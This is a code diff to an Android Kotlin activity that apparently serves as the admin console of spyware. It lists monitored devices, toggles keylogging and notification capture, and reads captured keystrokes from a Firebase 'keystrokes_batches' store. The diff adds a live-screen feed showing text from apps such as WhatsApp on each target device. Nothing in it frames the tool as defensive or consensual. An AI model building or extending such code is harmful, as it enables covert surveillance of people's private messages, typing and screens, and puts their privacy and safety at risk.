@@ -38,7 +38,9 @@ class AdminMainActivity : AppCompatActivity() {
         val name: String,
         var keylogging: Boolean = true,
         var notifications: Boolean = true,
-        var logFeed: String = "Waiting for telemetry..."
+        var liveScreenState: String = "Live Screen: Waiting...",
+        var isExpanded: Boolean = false,
+        var logFeed: String = "Waiting for device activity..."
     )
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -97,9 +99,11 @@ class AdminMainActivity : AppCompatActivity() {
                                 deviceList.add(device)
                                 listenToDeviceState(deviceName)
                                 listenToDeviceLogs(deviceName)
+                                listenToLiveScreen(deviceName)
                             }
                         }
                         for (appChild in child.children) {
+                            if (appChild.key == "live_screen") continue
                             for (entry in appChild.children) {
                                 totalEvents++
                             }
@@ -159,6 +163,25 @@ class AdminMainActivity : AppCompatActivity() {
         })
     }
 
+    private fun listenToLiveScreen(deviceName: String) {
+        val teleRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches").child(deviceName).child("live_screen")
+        teleRef.addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(snapshot: DataSnapshot) {
+                val screenText = snapshot.child("screenText").getValue(String::class.java)
+                val pkg = snapshot.child("packageName").getValue(String::class.java) ?: ""
+                val prettyApp = getPrettyAppName(pkg)
+
+                val index = deviceList.indexOfFirst { it.name == deviceName }
+                if (index != -1 && !screenText.isNullOrBlank()) {
+                    deviceList[index].liveScreenState = "Live Screen [$prettyApp]: $screenText"
+                    adapter.notifyItemChanged(index)
+                }
+            }
+
+            override fun onCancelled(error: DatabaseError) {}
+        })
+    }
+
     private fun getPrettyAppName(pkg: String): String {
         return when {
             pkg.contains("whatsapp", true) -> "WhatsApp"
@@ -183,9 +206,12 @@ class AdminMainActivity : AppCompatActivity() {
                 CoroutineScope(Dispatchers.IO).launch {
                     val entries = mutableListOf<Triple<Long, String, String>>()
                     val timeFormat = SimpleDateFormat("HH:mm:ss", Locale.getDefault())
+                    val twentyFourHoursAgo = System.currentTimeMillis() - (24 * 60 * 60 * 1000L)
 
                     for (appChild in snapshot.children) {
                         val rawApp = appChild.key ?: continue
+                        if (rawApp.startsWith("notification_", true)) continue
+                        if (rawApp == "live_screen") continue
                         val prettyApp = getPrettyAppName(rawApp)
                         for (entry in appChild.children) {
                             val text = entry.child("text").getValue(String::class.java)
@@ -195,7 +221,8 @@ class AdminMainActivity : AppCompatActivity() {
 
                             val timestampMillis = entry.child("timestamp").getValue(Long::class.java) ?: System.currentTimeMillis()
 
-                            if (text.isNotBlank() && text != "null") {
+                            // Filter: Last 24 hours only
+                            if (timestampMillis >= twentyFourHoursAgo && text.isNotBlank() && text != "null") {
                                 entries.add(Triple(timestampMillis, prettyApp, text))
                             }
                         }
@@ -213,7 +240,7 @@ class AdminMainActivity : AppCompatActivity() {
                     withContext(Dispatchers.Main) {
                         val index = deviceList.indexOfFirst { it.name == deviceName }
                         if (index != -1) {
-                            deviceList[index].logFeed = if (cappedEntries.isNotBlank()) cappedEntries else "No telemetry recorded yet."
+                            deviceList[index].logFeed = if (cappedEntries.isNotBlank()) cappedEntries else "No telemetry recorded in the last 24 hours."
                             adapter.notifyItemChanged(index)
                         }
                     }
@@ -230,11 +257,16 @@ class AdminMainActivity : AppCompatActivity() {
     ) : RecyclerView.Adapter<DeviceAdapter.ViewHolder>() {
 
         class ViewHolder(view: View) : RecyclerView.ViewHolder(view) {
-            val txtName: TextView = view.findViewById<TextView>(R.id.txtDeviceName)
+            val txtDeviceName: TextView = view.findViewById<TextView>(R.id.txtDeviceName)
+            val txtDeviceSub: TextView = view.findViewById<TextView>(R.id.txtDeviceSub)
+            val txtPresencePill: TextView = view.findViewById<TextView>(R.id.txtPresencePill)
             val btnKey: Button = view.findViewById<Button>(R.id.btnToggleKeyLog)
             val btnNotif: Button = view.findViewById<Button>(R.id.btnToggleNotifLog)
             val txtLog: TextView = view.findViewById<TextView>(R.id.txtDeviceLogConsole)
             val scrollView: View = view.findViewById<View>(R.id.logScrollView)
+            val txtLiveScreenState: TextView = view.findViewById<TextView>(R.id.txtLiveScreenState)
+            val layoutDeviceHeader: View = view.findViewById<View>(R.id.layoutDeviceHeader)
+            val layoutLogContainer: View = view.findViewById<View>(R.id.layoutLogContainer)
         }
 
         override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): ViewHolder {
@@ -244,7 +276,7 @@ class AdminMainActivity : AppCompatActivity() {
 
         override fun onBindViewHolder(holder: ViewHolder, position: Int) {
             val device = devices[position]
-            holder.txtName.text = "💻 ${device.name}"
+            holder.txtDeviceName.text = "💻 ${device.name}"
 
             if (device.keylogging) {
                 holder.btnKey.text = "KEY_LOG: ON"
@@ -262,18 +294,35 @@ class AdminMainActivity : AppCompatActivity() {
                 holder.btnNotif.setBackgroundResource(R.drawable.btn_red_rounded)
             }
 
-            holder.scrollView.setOnTouchListener { v, event ->
-                when (event.action) {
-                    MotionEvent.ACTION_DOWN, MotionEvent.ACTION_MOVE -> {
-                        v.parent.requestDisallowInterceptTouchEvent(true)
+            // Bind Live Screen State
+            holder.txtLiveScreenState.text = device.liveScreenState
+
+            // Collapse/Expand log area based on click on device header
+            if (device.isExpanded) {
+                holder.layoutLogContainer.visibility = View.VISIBLE
+                holder.txtDeviceSub.text = "Tap to collapse logs"
+
+                holder.scrollView.setOnTouchListener { v, event ->
+                    when (event.action) {
+                        MotionEvent.ACTION_DOWN, MotionEvent.ACTION_MOVE -> {
+                            v.parent.requestDisallowInterceptTouchEvent(true)
+                        }
+                        MotionEvent.ACTION_UP -> {
+                            v.parent.requestDisallowInterceptTouchEvent(false)
+                        }
                     }
-                    MotionEvent.ACTION_UP -> {
-                        v.parent.requestDisallowInterceptTouchEvent(false)
-                    }
+                    false
                 }
-                false
+                holder.txtLog.text = device.logFeed
+            } else {
+                holder.layoutLogContainer.visibility = View.GONE
+                holder.txtDeviceSub.text = "Tap to expand/collapse logs"
             }
-            holder.txtLog.text = device.logFeed
+
+            holder.layoutDeviceHeader.setOnClickListener {
+                device.isExpanded = !device.isExpanded
+                notifyItemChanged(position)
+            }
 
             holder.btnKey.setOnClickListener {
                 onToggle(device, "key", !device.keylogging)
